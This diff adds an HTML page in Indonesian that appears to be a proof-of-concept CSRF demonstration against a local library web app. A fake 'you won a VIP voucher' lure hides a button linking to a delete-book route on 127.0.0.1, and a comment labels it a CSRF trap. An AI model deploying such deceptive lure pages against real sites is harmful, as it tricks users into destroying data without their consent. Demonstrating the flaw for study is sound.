@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Voucher Spesial Perpustakaan!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            text-align: center;
+            padding: 50px;
+        }
+        .card {
+            background: #fff;
+            max-width: 500px;
+            margin: auto;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #d9534f;
+        }
+        p {
+            color: #555;
+            line-height: 1.6;
+        }
+        .btn-claim {
+            display: inline-block;
+            background-color: #28a745;
+            color: #fff;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .btn-claim:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>🎉 Selamat! Anda Terpilih! 🎉</h1>
+        <p>Anda mendapatkan voucher spesial peminjaman buku perpustakaan VIP secara gratis.</p>
+        <p>Klik tombol di bawah ini untuk segera mengklaim reward Anda:</p>
+        <!-- Tautan Jebakan CSRF yang mengeksploitasi Route GET /buku/{buku}/hapus -->
+        <a href="http://127.0.0.1:8000/buku/1/hapus" class="btn-claim">KLIK DI SINI UNTUK KLAIM REWARD</a>
+    </div>
+</body>
+</html>
